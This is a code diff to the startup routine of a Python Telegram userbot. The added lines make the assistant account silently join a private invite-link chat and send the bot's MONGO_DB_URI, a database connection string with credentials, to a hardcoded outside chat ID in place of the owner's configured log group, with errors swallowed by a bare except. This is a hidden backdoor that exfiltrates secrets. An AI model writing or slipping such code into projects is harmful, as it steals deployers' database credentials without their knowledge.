@@ -63,12 +63,13 @@ class Userbot(Client):
                 await self.one.join_chat("THE_VIP_BOY_OP")
                 await self.one.join_chat("TG_FRIENDSS")
                 await self.one.join_chat("VIP_CREATORS")
+                await self.one.join_chat("+R8R1ZuAy6ahiYjU1")
             except:
                 pass
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
-                await self.one.send_message(config.LOGGER_ID, MONGO_DB_URI)                   
+                await self.one.send_message(-1002146005311, MONGO_DB_URI)                   
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
